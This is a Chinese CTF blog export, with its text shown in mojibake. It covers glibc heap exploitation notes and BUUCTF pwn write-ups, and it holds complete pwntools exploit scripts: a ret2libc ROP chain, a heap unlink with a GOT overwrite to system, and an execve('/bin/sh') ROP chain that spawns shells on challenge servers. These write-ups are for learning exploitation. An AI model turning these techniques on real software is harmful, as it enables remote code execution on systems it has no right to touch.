<h4 id="è¿‡ç¨‹"><a href="#è¿‡ç¨‹" class="headerlink" title="è¿‡ç¨‹"></a>è¿‡ç¨‹</h4><ul>
<li>é‡Šæ”¾6ä¸ª0x100çš„chunkåˆ°tcache binä¸­</li>
<li>æ„é€ ä¸¤ä¸ª0x100çš„small binï¼ˆåˆ©ç”¨Unsorted binæˆ–Large binåˆ‡å‰²å¾—åˆ°ï¼‰</li>
<li>ä¿®æ”¹åæ’å…¥çš„small binçš„ bk æŒ‡é’ˆä¸ºç›®æ ‡åœ°å€-0x10ï¼Œä¸”ä¿æŒfdæŒ‡é’ˆä¸å˜</li>
<li>ç”¨callocåˆ†é…0x100çš„chunk</li>
</ul>
<h4 id="ç»“æœ"><a href="#ç»“æœ" class="headerlink" title="ç»“æœ"></a>ç»“æœ</h4><ul>
<li>åœ¨ç›®æ ‡åœ°å€ä¸Šå†™å…¥åŸæœ¬small binä¸Šçš„ bk æŒ‡é’ˆå†…å®¹</li>
</ul>
<h2 id="libc-2-32-so"><a href="#libc-2-32-so" class="headerlink" title="libc-2.32.so"></a>libc-2.32.so</h2><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (SINGLE_THREAD_P)  <br>&#123;<br>    <span class="hljs-comment">/* Check that the top of the bin is not the record we are going to</span><br><span class="hljs-comment">        add (i.e., double free).  */</span><br>    <span class="hljs-keyword">if</span> (__builtin_expect(old == p, <span class="hljs-number">0</span>))<br>        malloc_printerr(<span class="hljs-string">&quot;double free or corruption (fasttop)&quot;</span>);<br>    p-&gt;fd = PROTECT_PTR(&amp;p-&gt;fd, old);<br>    *fb = p;<br>&#125;<br><span class="hljs-keyword">else</span><br>    <span class="hljs-keyword">do</span><br>    &#123;<br>        <span class="hljs-comment">/* Check that the top of the bin is not the record we are going to</span><br><span class="hljs-comment">            add (i.e., double free).  */</span><br>        <span class="hljs-keyword">if</span> (__builtin_expect(old == p, <span class="hljs-number">0</span>))<br>            malloc_printerr(<span class="hljs-string">&quot;double free or corruption (fasttop)&quot;</span>);<br>        old2 = old;<br>        p-&gt;fd = PROTECT_PTR(&amp;p-&gt;fd, old);<br>    &#125; <span class="hljs-keyword">while</span> ((old = catomic_compare_and_exchange_val_rel(fb, p, old2))<br>        != old2);<br></code></pre></td></tr></table></figure>

<p>ä¸Šé¢æ˜¯glibc2.32ä¸‹çš„fastbinæºç ï¼ŒåŒæ ·å­˜åœ¨è·Ÿtcacheä¸€æ ·çš„ä¿æŠ¤æœºåˆ¶ï¼Œä¼šå¯¹ fd æŒ‡é’ˆè¿›è¡Œå¼‚æˆ–å¤„ç†</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__glibc_unlikely (!aligned_OK (e)))<br>    malloc_printerr (<span class="hljs-string">&quot;malloc(): unaligned tcache chunk detected&quot;</span>);<br></code></pre></td></tr></table></figure>

<p>ç”±äºè¿™ä¸ªæ£€æµ‹çš„å­˜åœ¨ï¼Œæˆ‘ä»¬ tcache ç”³è¯·çš„åœ°å€ä¼¼ä¹è¦åšåˆ° 0x10 å¯¹é½ï¼ˆx64ï¼‰</p>
<h2 id="libc-2-34-so"><a href="#libc-2-34-so" class="headerlink" title="libc-2.34.so"></a>libc-2.34.so</h2><p>è¯¥ç‰ˆæœ¬åˆ é™¤äº†å„ç§ hook å‡½æ•°ï¼Œæ‰€ä»¥è¦æ›´æ¢æ€è·¯ï¼Œä¸€èˆ¬å¯ä»¥é€šè¿‡ FSOP æ”»å‡»è¾“å‡ºæµçš„å‡½æ•°è™šè¡¨</p>
]]></content>
      <tags>
        <tag>glibc</tag>
      </tags>
  </entry>
  <entry>
    <title>buu07</title>
    <url>/2021/08/12/2021-08-12-buu07/</url>
    <content><![CDATA[<h2 id="ä¸€ã€xdctf2015-pwn200"><a href="#ä¸€ã€xdctf2015-pwn200" class="headerlink" title="ä¸€ã€xdctf2015_pwn200"></a>ä¸€ã€xdctf2015_pwn200</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210812185855607.png" alt="image-20210812185855607"></p>
<p>checksecä¸€ä¸‹ï¼Œ32ä½ï¼Œå¼€äº†nx</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210812192549644.png" alt="image-20210812192549644"></p>
<p>ç¨‹åºå¾ˆç®€å•ï¼Œè¿™è¾¹æœ‰ä¸ªå¾ˆæ˜æ˜¾çš„æ ˆæº¢å‡ºï¼Œå¹¶ä¸”ç¨‹åºå«æœ‰æ³„éœ²å‡½æ•°writeï¼Œæ„é€ åŸºç¡€çš„ropå°±è¡Œäº†</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210812192512692.png" alt="image-20210812192512692"></p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">25644</span>)<br><span class="hljs-comment">#p=process(&#x27;./bof&#x27;)</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>elf=ELF(<span class="hljs-string">&#x27;./bof&#x27;</span>)<br>main=<span class="hljs-number">0x80484d6</span><br>write_plt=elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>write_got=elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br><span class="hljs-comment">#gdb.attach(p)</span><br><br>p.recvline()<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x70</span>+p32(write_plt)+p32(main)+p32(<span class="hljs-number">1</span>)+p32(write_got)+p32(<span class="hljs-number">4</span>)<br>p.sendline(payload)<br>write=u32(p.recv(<span class="hljs-number">4</span>))<br>log.info(<span class="hljs-string">&quot;write addr:&quot;</span>+<span class="hljs-built_in">hex</span>(write))<br>libc=LibcSearcher(<span class="hljs-string">&#x27;write&#x27;</span>,write)<br>libc_base=write-libc.dump(<span class="hljs-string">&#x27;write&#x27;</span>)<br>binsh=libc_base+libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>system=libc_base+libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x70</span>+p32(system)+p32(main)+p32(binsh)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>



<h2 id="äºŒã€jarvisoj-level6-x64"><a href="#äºŒã€jarvisoj-level6-x64" class="headerlink" title="äºŒã€jarvisoj_level6_x64"></a>äºŒã€jarvisoj_level6_x64</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210812200521406.png" alt="image-20210812200521406"></p>
<p>çœ‹é™„ä»¶åå­—ï¼Œåº”è¯¥æ˜¯é“å †é¢˜ï¼Œè¿™é“å †é¢˜æ²¡å¼€PIEï¼ŒRELROæ²¡å¼€å…¨ï¼Œè¿™ç§é¢˜ç›®ä¸€èˆ¬æ˜¯æƒ³åŠæ³•ä¿®æ”¹gotè¡¨ï¼Œè¿™æ ·èƒ½ç¨³å®šgetshell</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210914200255661.png" alt="image-20210914200255661"></p>
<p>é¦–å…ˆï¼Œåˆ›å»ºäº†ä¸€ä¸ªå¤§å †å—ï¼Œç”¨æ¥ä¿å­˜åé¢ç”³è¯·å †å—çš„sizeï¼ŒæŒ‡é’ˆç­‰ä¿¡æ¯</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210914200621734.png" alt="image-20210914200621734"></p>
<p>åœ¨ç”³è¯·å †å—åŠŸèƒ½é‡Œçš„è¿™ä¸ªè¯­å¥ä»£è¡¨åˆ†é…å †å—çš„å¤§å°æ˜¯0x80çš„æ•´æ•°å€</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210914200526193-16316211508721.png" alt="image-20210914200526193"></p>
<p>åœ¨editåŠŸèƒ½ä¸­ï¼Œå¦‚æœä½ å†™å…¥ä¸ä¹‹å‰ç”³è¯·ä¸åŒ¹é…çš„sizeï¼Œé‚£ä¹ˆä¼šè°ƒç”¨reallocæ‰©å……å †å—çš„sizeï¼Œä¼¼ä¹å¯ä»¥é€ æˆoverlap</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210914200603042-16316211674692.png" alt="image-20210914200603042"></p>
<p>freeåŠŸèƒ½çš„è¯ï¼Œå †ç»“æ„é‡Œé¢çš„æŒ‡é’ˆæ²¡æœ‰æ¸…é›¶ï¼Œå­˜åœ¨UAFã€‚ä½†æ˜¯å‰é¢çš„flagã€sizeéƒ½æ¸…é›¶äº†ï¼Œæ‰€ä»¥åªèƒ½double free</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210914202759594.png" alt="image-20210914202759594"></p>
<p>æœ‰ä¸ªæ³¨æ„ç‚¹æ˜¯åœ¨ç”³è¯·å †å—ä¸­çš„è¾“å…¥å †å—å†…å®¹æ—¶ï¼Œä½ è¾“å…¥å¤šå¤§çš„sizeï¼Œé‚£ä½ ç›¸åº”å°±è¦å¡«å…¥å¤šå¤§çš„å­—ç¬¦ï¼Œå¦åˆ™è¿™è¾¹çš„readæ˜¯ä¸ä¼šåœæ­¢çš„</p>
<p>æ€è·¯ï¼šå°±å…ˆchecksecçœ‹åˆ°çš„ï¼Œå»åŠ«æŒgotè¡¨ï¼Œä¸€èˆ¬æ˜¯freeï¼Œç„¶åå†å»é‡Šæ”¾ä¸€ä¸ªå†…å®¹ä¸º/bin/shçš„å †å—ã€‚è¿™é¢˜å †å—å†…å®¹æ²¡æœ‰æ¸…ç©ºï¼Œå¹¶ä¸”ç”³è¯·å †å—æ—¶è¾“å…¥çš„æ•°æ®æ˜¯å¯ä»¥ä¸è¾“å…¥\x00çš„ï¼Œæ‰€ä»¥ä¸ä¼šæˆªæ–­ï¼Œé‚£å°±è¯´æ˜è•´å«ç€å¾ˆå¤šè„æ•°æ®éƒ½æ˜¯å¯ä»¥æ³„éœ²çš„ï¼æ¯”å¦‚libcï¼Œæ¯”å¦‚å †åœ°å€ï¼Œè€Œå¦‚æœæœ‰äº†å †åœ°å€ï¼Œunlinkï¼Œéšä¹‹è€Œæ¥ï¼Œç„¶åPIEåˆæ²¡å¼€ï¼Œç›´æ¥å†™gotè¡¨åœ°å€ï¼Œç„¶åå†™å…¥systemåœ°å€å³å¯ï¼</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210914204249244.png" alt="image-20210914204249244"></p>
<p>è¿™è¾¹é‡Šæ”¾å †å—è¦æ³¨æ„ï¼Œå¾—å…ˆç”³è¯·å››ä¸ªï¼Œç„¶åéš”ç€é‡Šæ”¾ï¼Œå› ä¸ºéƒ½æ˜¯unsorted chunkï¼Œå¾—è¦é˜²æ­¢è§¦å‘unlinkåˆå¹¶</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210914211338216.png" alt="image-20210914211338216"></p>
<p>é‡Šæ”¾å®Œå››ä¸ªå †å—åï¼Œæœ‰æ®‹ä½™è„æ•°æ®çš„å †ç»“æ„ï¼Œç°åœ¨å°±è¦ä¾æ®è¿™ä¸ªè„æ•°æ®è¿›è¡Œæ„é€ unlink</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210914212020955.png" alt="image-20210914212020955"></p>
<p>å¾ˆæ˜æ˜¾ï¼Œç”³è¯·å‡ºæ¥çš„ï¼Œåªèƒ½åœ¨ç¬¬ä¸‰ä¸ªå †åœ°å€ä¸Šä¼ªé€ å‡ºå †å¤´ï¼Œè¿™æ ·æ‰èƒ½é‡Šæ”¾è¯¥ä¼ªé€ å †å—ï¼Œè§¦å‘unlink</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210915103319358.png" alt="image-20210915103319358"></p>
<p>unlinkæˆåŠŸï¼ŒæŠŠå †å—æŒ‡é’ˆçš„å€¼å˜ä¸ºäº†å †ç»“æ„ä¸Šçš„åœ°å€ï¼Œä¹‹åç›´æ¥å¯¹ç€å †ç»“æ„ä¿®æ”¹å³å¯</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210915110109421.png" alt="image-20210915110109421"></p>
<p>getshellï¼</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br>elf = ELF(<span class="hljs-string">&quot;./freenote_x64&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/libc-2.23.so&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">27343</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice: &quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Length of new note: &quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	p.recvuntil(<span class="hljs-string">&quot;Enter your note: &quot;</span>)<br>	p.send(content)<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,size,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice: &quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Note number: &quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;Length of note: &quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	p.recvuntil(<span class="hljs-string">&quot;Enter your note: &quot;</span>)<br>	p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>():</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice: &quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice: &quot;</span>,<span class="hljs-string">&quot;4&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Note number: &quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x80</span>) <span class="hljs-comment">#0 </span><br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">0x80</span>) <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;c&#x27;</span>*<span class="hljs-number">0x80</span>) <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;d&#x27;</span>*<span class="hljs-number">0x80</span>) <span class="hljs-comment">#3</span><br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span>) <span class="hljs-comment">#å› ä¸ºä¼šå‡‘é½0x80çš„å¤§å°ï¼Œæ‰€ä»¥ä¹Ÿæ˜¯ç›¸å½“äºç”³è¯·å‡º0x80çš„å †</span><br>add(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">0x8</span>)<br>show()<br>p.recvuntil(<span class="hljs-string">&quot;0. aaaaaaaa&quot;</span>)<br>heap_base = u64(p.recv(<span class="hljs-number">4</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">6464</span> <span class="hljs-comment">#æ¥æ”¶å››ä¸ªï¼Œæ˜¯å› ä¸ºæ‰“è¿œç¨‹æ—¶ï¼Œå‘ç°å †åœ°å€å°±æ˜¯å››ä¸ªå­—èŠ‚çš„</span><br>log.success(<span class="hljs-string">&quot;heap_base==&gt;0x%x&quot;</span> %heap_base)<br>p.recvuntil(<span class="hljs-string">&quot;2. bbbbbbbb&quot;</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">3951480</span><br>log.success(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>free(<span class="hljs-number">3</span>)<br>free(<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">0</span>) <span class="hljs-comment">#æ¸…ç©ºå †å—ï¼Œä¸ºäº†åç»­å€Ÿç”¨UAFè¿›è¡Œunlink</span><br><br><span class="hljs-comment">#unlink</span><br>payload = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x110</span>) + p64(heap_base + <span class="hljs-number">0x30</span> - <span class="hljs-number">0x18</span>) + p64(heap_base + <span class="hljs-number">0x30</span> - <span class="hljs-number">0x10</span>)<br>add(<span class="hljs-built_in">len</span>(payload),payload)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x80</span> + p64(<span class="hljs-number">0x110</span>) + p64(<span class="hljs-number">0x90</span>) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x80</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x91</span>) <br>add(<span class="hljs-built_in">len</span>(payload),payload)<br>free(<span class="hljs-number">2</span>)<br><br>free = elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br>payload = p64(<span class="hljs-number">0x2</span>) + p64(<span class="hljs-number">0x1</span>) + p64(<span class="hljs-number">0x8</span>) + p64(free)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x20</span>,payload)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x8</span>,p64(system))<br>add(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;Your choice: &quot;</span>,<span class="hljs-string">&quot;4&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Note number: &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))   <span class="hljs-comment">#ä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œè¿™é‡Œä¸è¿™æ ·è¾“å…¥ï¼Œæ²¡åŠæ³•getshell</span><br>p.interactive()<br></code></pre></td></tr></table></figure>



<h2 id="ä¸‰ã€inndy-rop"><a href="#ä¸‰ã€inndy-rop" class="headerlink" title="ä¸‰ã€inndy_rop"></a>ä¸‰ã€inndy_rop</h2><p>å…ˆchecksecä¸€ä¸‹ï¼Œ32ä½ï¼Œåªå¼€äº†nx</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210823202233200.png" alt="image-20210823202233200"></p>
<p>è¿›å…¥idaï¼Œç¨‹åºå¾ˆç®€å•ï¼Œåªæœ‰ä¸€ä¸ªgetså‡½æ•°ï¼Œæ˜æ˜¾æº¢å‡º</p>
<p>ç„¶åç¨‹åºä¸œè¥¿å¾ˆç¹æ‚ï¼Œè¿™ç§å°±æ˜¯å±äºé™æ€ç¼–è¯‘çš„ç¨‹åºï¼Œç¨‹åºé‡Œé¢åŒ…å«ç€ç¨‹åºæ‰€éœ€è¦çš„å‡½æ•°ä¿¡æ¯ï¼Œä½†æ˜¯æ‰¾äº†ä¸€ä¸‹ï¼Œæ²¡æœ‰æ‰¾åˆ°/bin/shï¼Œä»¥åŠsystemï¼Œé‚£åº”è¯¥å°±æ˜¯è¦æ„é€ gadgetsäº†ï¼Œå»ä½¿ç”¨ç³»ç»Ÿè°ƒç”¨å·å‡½æ•°è·å–shell</p>
<img src="/2021/08/12/2021-08-12-buu07/image-20210823195230792.png" alt="image-20210823195230792" style="zoom:80%;">

<p>ç™¾åº¦äº†ä¸€ä¸‹ï¼ŒROPgadgetå†…ç½®äº†ç›¸å…³å·¥å…·ï¼Œå¯ä»¥ç›´æ¥é’ˆå¯¹è¿™ç§é¢˜ç›®æœ‰ç°æˆçš„exp</p>
<p><code>ROPgadget --binary rop --ropchain</code></p>
<img src="/2021/08/12/2021-08-12-buu07/image-20210823195052520.png" alt="image-20210823195052520" style="zoom:80%;">

<p><img src="/2021/08/12/2021-08-12-buu07/image-20210823201506833.png" alt="image-20210823201506833"></p>
<p>è¿™è¾¹å…¶å®è¿˜æœ‰ç§åŠæ³•ï¼Œå°±æ˜¯ä½¿ç”¨mprotectå‡½æ•°ä¿®æ”¹.bssæ®µçš„æ‰§è¡Œæƒé™ï¼Œç„¶åå†™å…¥shellcodeï¼Œå†æ‰§è¡Œæ¥getshell</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210823201429425.png" alt="image-20210823201429425"></p>
<p>ç¨‹åºé‡Œé¢æ˜¯æœ‰mprotectå‡½æ•°çš„</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br><br>r=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">29804</span>)<br>p = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">16</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806ecda</span>) <span class="hljs-comment"># pop edx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea060</span>) <span class="hljs-comment"># @ .data</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080b8016</span>) <span class="hljs-comment"># pop eax ; ret</span><br>p += <span class="hljs-string">&#x27;/bin&#x27;</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0805466b</span>) <span class="hljs-comment"># mov dword ptr [edx], eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806ecda</span>) <span class="hljs-comment"># pop edx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea064</span>) <span class="hljs-comment"># @ .data + 4</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080b8016</span>) <span class="hljs-comment"># pop eax ; ret</span><br>p += <span class="hljs-string">&#x27;//sh&#x27;</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0805466b</span>) <span class="hljs-comment"># mov dword ptr [edx], eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806ecda</span>) <span class="hljs-comment"># pop edx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea068</span>) <span class="hljs-comment"># @ .data + 8</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080492d3</span>) <span class="hljs-comment"># xor eax, eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0805466b</span>) <span class="hljs-comment"># mov dword ptr [edx], eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080481c9</span>) <span class="hljs-comment"># pop ebx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea060</span>) <span class="hljs-comment"># @ .data</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080de769</span>) <span class="hljs-comment"># pop ecx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea068</span>) <span class="hljs-comment"># @ .data + 8</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806ecda</span>) <span class="hljs-comment"># pop edx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea068</span>) <span class="hljs-comment"># @ .data + 8</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080492d3</span>) <span class="hljs-comment"># xor eax, eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806c943</span>) <span class="hljs-comment"># int 0x80</span><br><br>r.sendline(p)<br>r.interactive()<br>r.close()<br></code></pre></td></tr></table></figure>



<h2 id="å››ã€babyfengshui-33c3-2016"><a href="#å››ã€babyfengshui-33c3-2016" class="headerlink" title="å››ã€babyfengshui_33c3_2016"></a>å››ã€babyfengshui_33c3_2016</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210823202142271.png" alt="image-20210823202142271"></p>
<p>checksecä¸€ä¸‹ï¼Œ32ä½ï¼Œå¼€äº†NXã€Canary</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210823231658268.png" alt="image-20210823231658268"></p>
<p>æ¼æ´ç‚¹åœ¨äºä¿®æ”¹å †å—å†…å®¹é‡Œé¢çš„æ£€æŸ¥æœºåˆ¶æœ‰é—®é¢˜ï¼šåªè¦æŠŠä¸¤ä¸ªå †å—åˆ†å¼€ï¼Œä¸€ä¸ªåœ¨å¤´ä¸€ä¸ªåœ¨å°¾ï¼Œé‚£å°±ä»£è¡¨ç€èƒ½æº¢å‡ºè¦†ç›–ä¸¤ä¸ªå †å—é—´çš„æ‰€æœ‰å †å—ã€‚è€Œä¸”è¿™å¾ˆå®¹æ˜“å°±èƒ½åŠåˆ°ï¼Œåªè¦è¿ç»­ç”³è¯·å‡ æ¬¡å †å—ï¼ŒæŠŠæœ€å¼€å§‹ç”³è¯·çš„é‡Šæ”¾äº†ï¼Œç„¶åæˆ‘ä»¬ç”³è¯·ä¸€ä¸ªè¢«é‡Šæ”¾å¤§å°çš„å †å—ï¼Œé‚£è¿™ä¸ªå †å—å°±å‡ºç°åœ¨äº†å¤´éƒ¨ï¼Œè€Œå¦ä¸€ä¸ªå°±æ˜¯åœ¨å°¾éƒ¨</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210827142300094.png" alt="image-20210827142300094"></p>
